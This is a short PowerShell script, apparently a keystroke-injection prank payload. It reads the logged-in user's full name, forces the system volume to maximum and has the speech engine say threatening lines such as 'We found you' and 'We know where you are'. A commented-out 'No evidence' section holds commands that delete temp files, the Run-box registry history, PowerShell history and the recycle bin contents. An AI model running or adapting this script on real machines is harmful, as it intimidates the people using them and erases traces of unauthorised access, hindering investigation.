function Get-fullName {

    try {
    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
    }
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }
    return $fullName 

}

$FN = Get-fullName

# Set Volume
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}


$s=New-Object -ComObject SAPI.SpVoice
$s.Rate = -2
$s.Speak("We found you $FN")
$s.Speak("We know where you are")
$s.Speak("We are everywhere")
$s.Speak("Expect us")


#
# No evidence
#

# Delete contents of Temp folder 

#Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
#
## Delete run box history
#
#reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
#
## Delete powershell history
#
#Remove-Item (Get-PSreadlineOption).HistorySavePath
#
## Deletes contents of recycle bin
#
#Clear-RecycleBin -Force -ErrorAction SilentlyContinue